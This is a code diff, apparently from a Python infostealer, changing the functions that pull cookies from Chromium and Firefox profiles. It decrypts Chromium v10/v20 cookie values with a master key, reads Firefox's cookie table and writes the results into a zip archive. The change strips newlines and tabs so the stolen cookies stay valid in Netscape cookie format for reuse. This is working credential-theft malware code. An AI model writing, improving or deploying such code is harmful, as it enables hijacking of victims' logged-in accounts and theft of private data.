@@ -479,7 +479,9 @@ def process_chromium_browser(browser_name, config, master_key, zf):
                         for host, name, path, exp, sec, httpo, enc in cur.fetchall():
                             dec = decrypt_v10_v20_value(enc, master_key)
                             if dec and dec != "DECRYPT_FAILED":
-                                line = f"{host}\tTRUE\t{path}\t{str(bool(sec)).upper()}\t{exp}\t{name}\t{dec}\n"
+                                # Clean value for Netscape format: strip newlines and tabs which break the format
+                                safe_dec = dec.replace('\n', '').replace('\r', '').replace('\t', ' ')
+                                line = f"{host}\tTRUE\t{path}\t{str(bool(sec)).upper()}\t{exp}\t{name}\t{safe_dec}\n"
                                 cookies_content += line
                         conn.close()
                         if cookies_content.strip():
@@ -576,7 +578,9 @@ def process_firefox_browser(browser_name, config, zf):
                 cur = con.cursor()
                 cur.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
                 for host, name, value, path, expiry, secure in cur.fetchall():
-                    cookies_content += f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expiry}\t{name}\t{value}\n"
+                    # Clean value for Netscape format
+                    safe_val = value.replace('\n', '').replace('\r', '').replace('\t', ' ')
+                    cookies_content += f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expiry}\t{name}\t{safe_val}\n"
                 con.close()
                 if cookies_content: write_to_zip(zf, prefix + "cookies.txt", cookies_content)
             except: pass
